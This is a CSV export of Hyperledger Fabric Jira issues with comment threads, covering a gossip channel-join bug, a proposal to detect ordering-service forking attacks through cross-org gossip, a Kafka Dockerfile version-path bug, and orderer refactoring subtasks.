PTE instantiate chaincode on the org listed in the userInputs json,FAB-5245,19156,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,11/Jul/17 10:59 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,03/Aug/17 11:11 PM,,,,,,fabric-quality,,,,,,0,PTE,quality,,,,,"PTE instantiates chaincode on all org listed in the SC json file.

Want to update PTE to instantiate chaincode on the org listed in the userInput json.",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzy7u7:",,,,,,,,,,,,,,,,,,,,,,,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Gossip rejects join channel unless used with leader election,FAB-5246,19158,,Bug,To Do,FAB,Fabric,software,denyeart,,,Medium,,,yacovm,yacovm,11/Jul/17 11:18 PM,23/Nov/20 11:45 PM,28/Oct/23 3:00 AM,,v1.0.0,v1.1.0,v1.2.0,Future,,fabric-gossip,,,,,,0,active,gossip,,,,," 

Background:
 # To Join a channel you need to give a peer a genesis block, even if the org has been added after channel creation (in a later block than the genesis block)
 # Gossip performs sanity checks on the configuration blocks and if the peer's organization isn't within the members of the channel (which is the case for the genesis block) - it rejects the join channel.
 # If the peer is used with leader election activated, it will consider itself a leader in that channel (since it doesn't see other peers) and would connect to the ordering service and fetch blocks for that channel.
 # When the peer got the latest configuration block that adds its organization to the channel, gossip is activated for the channel.
 # If the peer isn't configured to use leader election and is configured not to connect to the ordering service (but instead - to receive blocks from fellow peers) - it would not receive blocks from peers of its own org because it would consider them as not in the channel.

 

To reproduce:

Run [https://github.com/sandp125/FabricNodeAPI_V1] , it uses leader election by default.
 in that test there are 2 orgs - org1, org2 and later org3 is added to the channel.

It can be seen in the logs of the peers from org3 the error:

""Tried joining channel <channel name>, ""but our org (orgName), isn't among the orgs of the channel:"", orgListFromConfig(config), "", aborting."")""
 
from the peer logs, the peers declare themselves leaders, connect to the ordering service, and then get the blocks up to the last one. After a while (5 seconds) it can be seen in peer1.org3:
{quote}""Renounced leadership, stopping delivery service for channel mychannel1""
 [deliveryClient] StopDeliverForChannel -> DEBU 3fe This peer will stop pass blocks from orderer service to other peers
{quote}
So it seems like it sensed peer0.org3 after the last config update.

When leader election isn't used - and peer0.org3 is configured to be a leader statically, and peer1.org3 is configured statically to not be a leader, **peer1.org3 doesn't get any blocks.**",,ChristopherFerris,denyeart,kchristidis,scottz,yacovm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-8416,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|i01h7y:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,denyeart,kchristidis,scottz,yacovm,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Jul/17 11:02 AM;kchristidis;A couple questions, with perhaps overlapping answers:
 # All peers of org3 asked to join the channel reject the call because of background item #2. True/false? (Logic says this is true.)
 # At this point does each peer of org3 consider themselves a leader of that channel? Background item #3 makes it sound like they do, but how can you be the leader of a channel you haven't joined? I suspect I am misinterpreting this.;;;","12/Jul/17 4:10 PM;yacovm;{quote}All peers of org3 asked to join the channel reject the call because of background item #2. True/false? (Logic says this is true.)
{quote}
So it's not that the peer rejects the join channel. The gossip layer of the peer does. This holds for all peers of the new org.
{quote}At this point does each peer of org3 consider themselves a leader of that channel?
{quote}
Yeah, if leader election is used (in core.yaml)

{quote}Background item #3 makes it sound like they do, but how can you be the leader of a channel you haven't joined? I suspect I am misinterpreting this.{quote}

Great question.

So here is how it works - the gossip subcomponent of the peer can be roughly described as built in the following layers:
{code:java}
   L2             Leader election   module   |    state transfer module
   L1                     membership and dissemination modules
   L0                          communication module{code}
There is also the deliver service (which pulls blocks from the ordering service) and it receives command whether to stop itself or start itself from the leader election module.

Let's take a dive and see how the flow works: [createChain|https://github.com/hyperledger/fabric/blob/master/core/peer/peer.go#L232] calls [InitializeChannel|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L174]  which:
* [Initializes a state transfer module|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L179] instance for that channel 
* [Initializes a delivery service|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L182] instance for the channel 
* [Initializes a leader election|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L206] instance for the channel, that receives its messages and sends messages via what is in L1 (in the code, L1 is aggregated under gossip/gossip).

 Now, the thing that configures gossip's layers L1 with respect to the channel join is done via  [createChain|https://github.com/hyperledger/fabric/blob/master/core/peer/peer.go#L181] that calls [ProcessConfigUpdate|https://github.com/hyperledger/fabric/blob/master/gossip/service/eventer.go#L69] which then does to [configUpdated|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L219] which does the following check:
{code}
	myOrg := string(g.secAdv.OrgByPeerIdentity(api.PeerIdentityType(g.peerIdentity)))
	if !g.amIinChannel(myOrg, config) {
		logger.Error(""Tried joining channel"", config.ChainID(), ""but our org("", myOrg, ""), isn't ""+
			""among the orgs of the channel:"", orgListFromConfig(config), "", aborting."")
		return
}
{code}

and if this succeeds, it calls [JoinChain|https://github.com/hyperledger/fabric/blob/master/gossip/service/gossip_service.go#L241] on the gossip module (L1) 
which does the following things:
* Tells the ""channel"" module in the gossip layer (we have a module that manages all channel related decisions and keeps all channel related information) to create a new channel instance if needed
* Tells the gossip layer to try to connect to the anchor peers of the channel, if needed.

Now, the first part doesn't do the check, but the 2nd one does. 
So the leader election module doesn't receive *any* messages from the layers below it, and considers itself alone in the world - hence deciding to nominate itself as a leader, and then commands the delivery service to connect to the ordering service.
Eventually, the *configUpdated* method would be called again and then the configuration would contain the peer's own org and then the lower layers of gossip would join the channel. ;;;","12/Jul/17 9:40 PM;kchristidis;I think that clears it for me, thanks.;;;","27/Nov/17 12:48 PM;denyeart;[~yacovm] Do you think this should be fixed for 1.1? What do you propose as next steps?;;;","27/Nov/17 5:01 PM;yacovm;There is no way of fixing this in v1.1 because we can only join with the GB... ;;;","19/Feb/18 11:38 AM;scottz;This means we cannot support gossip unless leader election is used. Is this documented anywhere??? [~denyeart] , [~yacovm]. We could say that mode is allowed for simple experimentation, but cannot handle org additions.;;;","19/Feb/18 4:31 PM;yacovm;{quote}This means we cannot support gossip unless leader election is used
{quote}
No, that is not what it means.

 
{quote}Is this documented anywhere???
{quote}
Not to my knowledge.
{quote}We could say that mode is allowed for simple experimentation, but cannot handle org additions.
{quote}
I wouldn't put it like that. You can always just make everyone connect to the orderer.

 

This issue, by the way - isn't a gossip issue at all. Gossip actually functions as it should.

We have a similar issue with the deliver service and ordering endpoints and orderer root CA certs.
I suggest we document all of that in the document of the org reconfiguration or in a new one.;;;","06/Apr/18 2:52 AM;ChristopherFerris;So, is this issue relevant exclusively to 1.0.x? If so, then I would advocate we close this since we aren't planning any further patches to 1.0. [~yacovm] [~mastersingh24] do you concur?;;;","06/Apr/18 3:11 AM;yacovm;not exclusive to any release. We can't solve it until we separate MSP managers between blockchain MSP managers to admission path MSP managers... ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Detect forking attacks with gossip,FAB-5247,19159,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,ales,ales,11/Jul/17 11:58 PM,23/Jan/20 6:53 AM,28/Oct/23 3:00 AM,23/Jan/20 6:53 AM,,,,Future,,fabric-gossip,,,,,,1,gossip,security,Security,stale-item,,,"Scenario:
 * an HLF installation uses orderers that are CFT only. This is either because BFT orderers are not yet available or because the admin of that HLF instance has decided that it is acceptable
 * the CFT assumption (which is a security assumption, it basically says ""we assume that orderers are honest and will at worst crash"") is violated - either because the ordering network is hacked in or because its administrators have become malicious and chosen to misbehave

We are in presence of a malicious ordering network What may happen?
 * tx forgery is not possible (because the ordering network alone does not possess signing identities of any application org)
 * *A1*: silently dropping txes is possible (e.g. the ordering network receives a tx in broadcast and it never returns it through a deliver)
 * *A2*: forking attacks are possible (e.g. peer1 receives txA then txB then txC; peer2 receives txA then txC then txB)

There seems to be an easy enough way in which cross-org gossip may be leveraged to at least detect *A2*. How? If orgs gossip about the pair _(blockheight, hash)_, they will detect inconsistencies (because the hash value will not match).

Is this detection valuable? If an attack has been successfully perpetrated, it may or may not be reversible. Though of course knowing that it took place (as opposed to not knowing) has value, org members may take legal actions... etc.",,ales,angelo.decaro,denyeart,mne,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy7uv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ales,angelo.decaro,denyeart,mne,sykesm,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/17 11:59 PM;ales;[~C0rWin], [~yacovm], [~elli-androulaki], [~angelo.decaro], [~mne] - what do you guys think?;;;","12/Jul/17 12:23 AM;mne;I agree. Especially in a permissioned blockchain it makes sense to detect such inconsistencies caused by potential cheating, even if there is no technical means of automatically recovering from such an event (because the truth is unclear).

To me (cross-organization) gossip seems to be a good means to detect the inconsistencies.;;;","12/Jul/17 9:22 AM;angelo.decaro;I agree. I want to add that also in the case of a deployment with BFT that cross check can help understanding if the BFT security assumption has been violated at least in the case of forking. ;;;","12/Jul/17 6:37 PM;yacovm;I think it's a great idea, and can be very effective if combined with a feedback mechanism such as:
* The existing events framework
* A system that parses log files and ships them to a dashboard (i.e the ELK stack)
* Sending the event to a telemetrics/monitoring system that can alert the organization;;;","13/Jul/17 8:51 PM;ales;Adding [~cca88];;;","23/Mar/18 2:07 PM;denyeart;Many issues were bulk moved from v1.0 or v1.1 to v1.2 as part of a cleanup effort, and many of these issues are not high priority or actually intended to be worked for v1.2.  This issue is being bulk moved to Future.  If the issue is indeed high priority for v1.2 and/or very low effort, please move back to v1.2 and add a comment to indicate rationale.;;;","23/Jan/20 6:53 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""make kafka"" failure for any non-default version, due to images/kafka/Dockerfile.in hardcoded pathname",FAB-5252,19168,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,kchristidis,scottz,scottz,12/Jul/17 1:46 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,20/Jul/17 1:37 AM,v1.0.0,,,v1.1.0,,fabric-build,fabric-orderer,,,,,0,build-system,kafka,quality,Usability,,,"+Problem+:  ""make kafka"" failure, for any version besides the default 0.9.0.1.

+Background+: In addition to changing orderer.yaml KafkaVersion, it seems one must also change [https://github.com/hyperledger/fabric/blob/master/images/kafka/Dockerfile.in#L8] (from 0.9.0.1 to one of the other supported values: 0.10.0.0 or 0.10.0.1 or 0.10.1.0 ) and ""make kafka"" image before deployment. I edited .../fabric/images/kafka/Dockerfile.in line 8 to make this change, and the ""make kafka"" command failed with error:
{quote}curl: (22) The requested URL returned error: 404 Not Found
{quote}
+Proposed solution+:  Observe in line 11 of Dockerfile.in, we curl the kafka - however it uses a hardcoded pathname to 0.9.0.1 , causing the failure. If I am not mistaken, we should change the address from
{quote}http://www-us.apache.org/dist/kafka/0.9.0.1/kafka_$\{SCALA_VERSION}-$\{KAFKA_VERSION}.tgz
{quote}
to
{quote}http://www-us.apache.org/dist/kafka/$\{KAFKA_VERSION}/kafka_$\{SCALA_VERSION}-$\{KAFKA_VERSION}.tgz
{quote}
+WORKAROUND+: Since the user has to edit the Dockerfile.in already to change the KAFKA_VERSION, the user could also change the hardcoded pathname from 0.9.0.1 to the appropriate version - as in the suggested solution below.

+Additional request for accompanying documentation+: we could also use some documentation with better instructions of how-to steps to use different kafka versions. [http://hyperledger-fabric.readthedocs.io/en/latest/kafka.html] provides some info but does not explain that the images/kafka/Dockerfile.in must be edited and new images must be built (in addition to setting orderer.yaml KAFKA_VERSION).",,kchristidis,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7vz:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,scottz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 4:29 AM;scottz;I tried to ""make kafka"" after making the changes I suggested, but it failed. Apparently we will need an additional change. I must be missing something...
{quote}kafka_2.11-0.10.1.0.tgz: FAILED
sha1sum: WARNING: 1 computed checksum did NOT match
{quote};;;","18/Jul/17 1:42 AM;kchristidis;https://gerrit.hyperledger.org/r/#/c/11697/;;;","18/Jul/17 1:43 AM;kchristidis;Scott, the reason for the failure in your test is that you didn't update the SHA-1 hash (KAFKA_DOWNLOAD_SHA1) accordingly.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update references to RC-1 in docs,FAB-5257,19175,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,nickgaski,markparz,markparz,12/Jul/17 2:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Jul/17 4:40 AM,,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,,,,,,Need to scrub and update release candidate / RC references to v1.0,,denyeart,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7x3:",,,,,,,,,,,,,,,,,,,,,,,denyeart,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 4:40 AM;denyeart;https://gerrit.hyperledger.org/r/#/c/11561;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Optimize orderer message processing flow to remove redundant checks,FAB-5258,19176,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,jyellick,jyellick,12/Jul/17 2:49 AM,21/Jul/18 3:54 AM,28/Oct/23 3:00 AM,10/Nov/17 5:50 AM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,performance,,,,,,"The current orderer works in a two pass message filtering architecture.  The initial pass is done when the client invokes {{Broadcast}} and verifies that the message might be valid once ordered, then sends to the consenter for ordering.  After ordering, the consenter re-runs the verification on the messages as a second pass. This second pass ensures that the message is still valid, even after the other in-flight messages have committed.

The only cause of a message validating at {{Broadcast}} but not validating after ordering is if the channel configuration changes.  For instance, the max message size might be reduced, a certificate might be revoked, etc.

The problem with this architecture is that it implies that in the Kafka case, all messages are processed {{n+1}} times, where {{n}} is the number of OSNs.  In the Solo case, this implies messages are processed {{2}} times (as {{n}} is fixed to {{1}}.  However, in the green path, it should only be necessary to process the message {{1}} time.

The message verification step is the primary CPU bound (as it involves hashing and checking signatures) for the orderer, so improving from {{n+1}} to {{1}} has the potential to double or more the performance of the orderer.

To achieve this change, the orderer common components must be noticeably restructured.  The {{Broadcast}} path needs to include the config sequence at which the message was validated when pushing to consenus.  Then, the consenter needs to track changes in the config sequence number, trigger the second pass revalidation only when needed.  The message validation is currently buried within filters and filters within blockcutter, so this will need to be factored out into its own message processing package.

This is also a good opportunity to fix some of the directory structure which has accumulated considerable cruft during the v1 development.

Will add architectural diagrams.",,asaningmaxchain,caoyu,guoger,inatatsu,jyellick,kchristidis,sanchezl,wutongtree,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-6421,FAB-6444,,,,,,,,,,,,,,,,,,,FAB-5969,,,,,,,,,,,,"12/Jul/17 3:16 AM;jyellick;config_msg_flow.png;https://jira.hyperledger.org/secure/attachment/11644/config_msg_flow.png","12/Jul/17 3:16 AM;jyellick;normal_msg_flow.png;https://jira.hyperledger.org/secure/attachment/11643/normal_msg_flow.png",,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy7xb:",,,,Unset,,,,,,,13.0,Unset,,,,,,,,,,,asaningmaxchain,caoyu,guoger,inatatsu,jyellick,kchristidis,sanchezl,wutongtree,yoheiueda,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Aug/17 4:16 PM;guoger;For solo orderer, message needs to be revalidated in consenter, *iff*:
1. {{ConfigUpdate}} received at broadcast and validated
2. broadcast sends {{ConfigUpdate}} to consenter, and block waiting for it being consumed
3. consenter consumes {{ConfigUpdate}}, unblocks broadcast
4. {{NormalMsg}} received at broadcast and validated
5. {{ConfigUpdate}} is applied, causing _ConfigSeq_ to be advanced
6. broadcast sends {{NormalMsg}} to consenter
7. Since _ConfigSeq_ is advanced, {{NormalMsg}} is *revalidated*

In another word, the reason of message being valid at broadcast but invalid at consenter, is that *Config being applied asynchronously*.

Is this correct? Is there any other case where messages need to be revalidated? Also, could you point me to a test case for this? thx [~jyellick];;;","08/Aug/17 11:20 PM;jyellick;[~guoger] Yes, the flow you suggest is correct.

Essentially, the many parallel go routines may validate messages concurrently in the context of the current configuration.  So long as this configuration does not change, we may assume that the validation will not change between the ingress validation, and ordering.

We detect that the configuration has changed by including a sequence number along with the validation.  If the configuration's sequence advances between validation and commit time, then the messages must be revalidated before commit.

I took a quick glance at the solo code, and I do not think there are any tests for this yet, which is definitely a deficiency.  I'm creating a task to add them.  Feel free to assign to yourself or I will get around to it eventually.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
No title specified for architecture.html,FAB-5259,19177,,Bug,Closed,FAB,Fabric,software,denyeart,,,Lowest,Done,luomin,tkuhrt,tkuhrt,12/Jul/17 2:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Oct/17 3:56 AM,v1.0.0,,,Not a Bug,,fabric-docs,,,,,,0,,,,,,,"While doing a search of the documentation, I was returned a <<no title>> document: http://hyperledger-fabric.readthedocs.io/en/latest/architecture.html",,joe-alewine,kuangue,luomin,markparz,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7xj:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,kuangue,luomin,markparz,tkuhrt,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Jul/17 2:57 AM;markparz;This is really a dead page, that we are ripping pieces out of for other pieces of doc... once completely ransacked, we'll delete this page altogether.;;;","14/Sep/17 3:08 AM;markparz;Hi Min, What's being reviewed here? I didn't see a CR, and we don't need this this page. I think we should just close this issue.;;;","14/Sep/17 4:04 AM;tkuhrt;If the page is not needed, it should be removed completely from being generated and ensure that there are no links to it in the rest of the documentation. Please don't close the issue without fixing. I can still get to this page.;;;","20/Sep/17 10:16 AM;luomin;Hi, [~tkuhrt], I've removed the old documentation 'architecture.rst' as you pointed here, together with 'whyfabric.rst' doc in this folder, and the other pages in this folder seems contain no links to these two docs. the patch is [https://gerrit.hyperledger.org/r/#/c/13387/.]  is that what you want?;;;","27/Oct/17 1:18 AM;joe-alewine;Have posted gerrit link to delete these docs in fabric-pr-review.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update balance-transfer sample to v1.0.0,FAB-5260,19179,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,jimthematrix,jimthematrix,12/Jul/17 3:07 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,02/Nov/17 4:38 AM,v1.0.0-rc1,,,v1.0.0,,fabric-sdk-node,,,,,,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7xr:",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove committers from the blockcutter path,FAB-5261,19180,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:17 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 7:14 PM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7xz:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:52 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11493/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove committers from ProcessConfigMsg,FAB-5262,19181,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,19/Jul/17 7:15 PM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7y7:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:52 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11495/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Reorganize orderer dir,FAB-5263,19182,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,21/Jul/17 9:28 PM,,,,v1.1.0,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2489,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7yf:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:52 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11497/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move interfaces from multichannel,FAB-5264,19183,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Aug/17 1:48 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7yn:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove blockcutter message validation,FAB-5265,19184,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:18 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,31/Jul/17 5:53 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7yv:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:53 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11501/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Replace the Enqueue method,FAB-5266,19185,19176,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,12/Jul/17 3:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,31/Jul/17 5:55 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy7z3:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jul/17 4:53 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11503/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
